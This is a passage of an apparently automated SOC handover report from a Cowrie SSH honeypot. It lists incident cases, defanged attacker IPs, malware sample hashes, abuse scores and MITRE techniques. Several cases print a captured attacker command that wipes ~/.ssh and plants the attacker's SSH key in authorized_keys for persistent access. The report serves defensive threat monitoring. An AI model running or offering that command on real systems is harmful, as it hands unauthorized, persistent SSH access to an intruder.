| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 12:26:00` | `cowrie.session.connect` |
| `2026-04-12 12:26:00` | `cowrie.client.version` |
| `2026-04-12 12:26:00` | `cowrie.client.kex` |
| `2026-04-12 12:26:01` | `cowrie.login.success` |
| `2026-04-12 12:26:01` | `cowrie.session.params` |
| `2026-04-12 12:26:01` | `cowrie.command.input` |
| `2026-04-12 12:26:01` | `cowrie.command.failed` |
| `2026-04-12 12:26:02` | `cowrie.log.closed` |
| `2026-04-12 12:26:02` | `cowrie.session.params` |
| `2026-04-12 12:26:02` | `cowrie.command.input` |
| `2026-04-12 12:26:02` | `cowrie.session.file_download` |
| `2026-04-12 12:26:02` | `cowrie.log.closed` |
| `2026-04-12 12:26:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.142[.]151` to AbuseIPDB if not already reported
- [ ] Block `172.190.142[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2667b1561193

| Field | Detail |
|---|---|
| **Source IP** | `172.190.142[.]151` |
| **First Seen** | 2026-04-12 12:26 |
| **Last Seen** | 2026-04-12 12:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 12:26:05` | `cowrie.session.connect` |
| `2026-04-12 12:26:05` | `cowrie.client.version` |
| `2026-04-12 12:26:06` | `cowrie.client.kex` |
| `2026-04-12 12:26:06` | `cowrie.login.success` |
| `2026-04-12 12:26:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.142[.]151` to AbuseIPDB if not already reported
- [ ] Block `172.190.142[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a65937dce7d3

| Field | Detail |
|---|---|
| **Source IP** | `172.190.142[.]151` |
| **First Seen** | 2026-04-12 12:27 |
| **Last Seen** | 2026-04-12 12:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 12:27:41` | `cowrie.session.connect` |
| `2026-04-12 12:27:41` | `cowrie.client.version` |
| `2026-04-12 12:27:41` | `cowrie.client.kex` |
| `2026-04-12 12:27:42` | `cowrie.login.success` |
| `2026-04-12 12:27:42` | `cowrie.session.params` |
| `2026-04-12 12:27:42` | `cowrie.command.input` |
| `2026-04-12 12:27:42` | `cowrie.command.failed` |
| `2026-04-12 12:27:42` | `cowrie.log.closed` |
| `2026-04-12 12:27:43` | `cowrie.session.params` |
| `2026-04-12 12:27:43` | `cowrie.command.input` |
| `2026-04-12 12:27:43` | `cowrie.session.file_download` |
| `2026-04-12 12:27:43` | `cowrie.log.closed` |
| `2026-04-12 12:27:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.142[.]151` to AbuseIPDB if not already reported
- [ ] Block `172.190.142[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-032cdb16b62b

| Field | Detail |
|---|---|
| **Source IP** | `172.190.142[.]151` |
| **First Seen** | 2026-04-12 12:27 |
| **Last Seen** | 2026-04-12 12:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 12:27:46` | `cowrie.session.connect` |
| `2026-04-12 12:27:46` | `cowrie.client.version` |
| `2026-04-12 12:27:46` | `cowrie.client.kex` |
| `2026-04-12 12:27:47` | `cowrie.login.success` |
| `2026-04-12 12:27:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.142[.]151` to AbuseIPDB if not already reported
- [ ] Block `172.190.142[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94a5e94c65eb

| Field | Detail |
|---|---|
| **Source IP** | `172.190.142[.]151` |
| **First Seen** | 2026-04-12 12:29 |
| **Last Seen** | 2026-04-12 12:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 12:29:18` | `cowrie.session.connect` |
| `2026-04-12 12:29:18` | `cowrie.client.version` |
| `2026-04-12 12:29:18` | `cowrie.client.kex` |
| `2026-04-12 12:29:19` | `cowrie.login.success` |
| `2026-04-12 12:29:20` | `cowrie.session.params` |
| `2026-04-12 12:29:20` | `cowrie.command.input` |
| `2026-04-12 12:29:20` | `cowrie.command.failed` |
| `2026-04-12 12:29:20` | `cowrie.log.closed` |
| `2026-04-12 12:29:21` | `cowrie.session.params` |
| `2026-04-12 12:29:21` | `cowrie.command.input` |
| `2026-04-12 12:29:21` | `cowrie.session.file_download` |
| `2026-04-12 12:29:21` | `cowrie.log.closed` |
| `2026-04-12 12:29:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.142[.]151` to AbuseIPDB if not already reported
- [ ] Block `172.190.142[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62095ec1e744

| Field | Detail |
|---|---|
| **Source IP** | `172.190.142[.]151` |
| **First Seen** | 2026-04-12 12:29 |
| **Last Seen** | 2026-04-12 12:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 12:29:24` | `cowrie.session.connect` |
| `2026-04-12 12:29:24` | `cowrie.client.version` |
| `2026-04-12 12:29:24` | `cowrie.client.kex` |
| `2026-04-12 12:29:25` | `cowrie.login.success` |
| `2026-04-12 12:29:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.142[.]151` to AbuseIPDB if not already reported
- [ ] Block `172.190.142[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6800c816f5bf

| Field | Detail |
|---|---|
| **Source IP** | `172.190.142[.]151` |
| **First Seen** | 2026-04-12 12:39 |
| **Last Seen** | 2026-04-12 12:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 12:39:23` | `cowrie.session.connect` |
| `2026-04-12 12:39:23` | `cowrie.client.version` |
| `2026-04-12 12:39:23` | `cowrie.client.kex` |
| `2026-04-12 12:39:24` | `cowrie.login.success` |
| `2026-04-12 12:39:25` | `cowrie.session.params` |
| `2026-04-12 12:39:25` | `cowrie.command.input` |
| `2026-04-12 12:39:25` | `cowrie.command.failed` |
| `2026-04-12 12:39:25` | `cowrie.log.closed` |
| `2026-04-12 12:39:26` | `cowrie.session.params` |
| `2026-04-12 12:39:26` | `cowrie.command.input` |
| `2026-04-12 12:39:26` | `cowrie.session.file_download` |
| `2026-04-12 12:39:26` | `cowrie.log.closed` |
| `2026-04-12 12:39:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.142[.]151` to AbuseIPDB if not already reported
- [ ] Block `172.190.142[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6aa2cc8acc06

| Field | Detail |
|---|---|
| **Source IP** | `172.190.142[.]151` |
| **First Seen** | 2026-04-12 12:39 |
| **Last Seen** | 2026-04-12 12:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 12:39:29` | `cowrie.session.connect` |
| `2026-04-12 12:39:29` | `cowrie.client.version` |
| `2026-04-12 12:39:29` | `cowrie.client.kex` |
| `2026-04-12 12:39:30` | `cowrie.login.success` |
| `2026-04-12 12:39:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.142[.]151` to AbuseIPDB if not already reported
- [ ] Block `172.190.142[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `172.190.142[.]151` | **25** | 2026-04-12 12:00 | 2026-04-12 12:42 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.76.104[.]44` | **24** | 2026-04-12 12:05 | 2026-04-12 12:21 | 30m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.145[.]231` | **19** | 2026-04-12 11:21 | 2026-04-12 12:25 | 29m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.47.159[.]125` | **17** | 2026-04-12 10:36 | 2026-04-12 11:03 | 0m | 17 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `154.209.4[.]195` | **17** | 2026-04-12 10:36 | 2026-04-12 11:05 | 0m | 17 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `69.6.221[.]248` | **17** | 2026-04-12 10:36 | 2026-04-12 11:05 | 0m | 17 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `209.141.41[.]212` | **16** | 2026-04-12 10:36 | 2026-04-12 10:47 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `62.3.56[.]187` | **16** | 2026-04-12 10:36 | 2026-04-12 11:00 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `181.23.113[.]121` | **7** | 2026-04-12 10:39 | 2026-04-12 11:07 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `115.239.224[.]92` | **2** | 2026-04-12 11:21 | 2026-04-12 11:23 | 4m | 0 | `T1592` | 🟢 LOW |
| `14.103.50[.]32` | **2** | 2026-04-12 11:24 | 2026-04-12 11:26 | 4m | 0 | `T1592` | 🟢 LOW |
| `128.1.38[.]169` | 1 | 2026-04-12 10:36 | 2026-04-12 10:36 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `157.245.245[.]246` | 1 | 2026-04-12 12:01 | 2026-04-12 12:01 | 2s | 0 | `T1592` | 🟢 LOW |
| `183.36.126[.]68` | 1 | 2026-04-12 11:20 | 2026-04-12 11:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.158.22[.]150` | 1 | 2026-04-12 11:20 | 2026-04-12 11:20 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `52.91.15[.]149` | 1 | 2026-04-12 12:55 | 2026-04-12 12:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `61.69.225[.]168` | 1 | 2026-04-12 11:59 | 2026-04-12 12:00 | 13s | 0 | `T1592` | 🟢 LOW |
| `64.236.187[.]241` | 1 | 2026-04-12 12:56 | 2026-04-12 12:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `81.193.216[.]17` | 1 | 2026-04-12 11:21 | 2026-04-12 11:21 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `93.123.109[.]222` | 1 | 2026-04-12 12:47 | 2026-04-12 12:47 | 0s | 3 | `T1110.001` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `181.23.113[.]121` | AR | Telefonica de Argentina | **100** ⚠️ | 1 |
| `157.245.245[.]246` | US | DigitalOcean, LLC | **100** ⚠️ | 16 |
| `61.69.225[.]168` | AU | AAPT Limited | **100** ⚠️ | 0 |
| `128.1.38[.]169` | SG | UCLOUD | **100** ⚠️ | 50 |
| `154.209.4[.]195` | HK | Yisu Cloud Ltd | **100** ⚠️ | 26 |
| `69.6.221[.]248` | BR | Newfold Digital, Inc. | **100** ⚠️ | 13 |
| `172.190.142[.]151` | US | Microsoft Limited | **100** ⚠️ | 39 |
| `180.76.104[.]44` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `101.47.159[.]125` | SG | BYTEPLUS | **100** ⚠️ | 33 |
| `81.193.216[.]17` | PT | PT Comunicacoes S.A. | **100** ⚠️ | 41 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 262 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 127 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 95 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 49 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 49 |

---

## 🔕 False Positive Summary (4 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 270 cases |
| Tool 34  | Credential Extractor        | ✅ 224 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 22 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 4 filtered (1.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 19 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 95 priority case(s) shown individually · 20 recon entry/entries in table (11 group(s) consolidating 162 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-12T12:57:48Z_
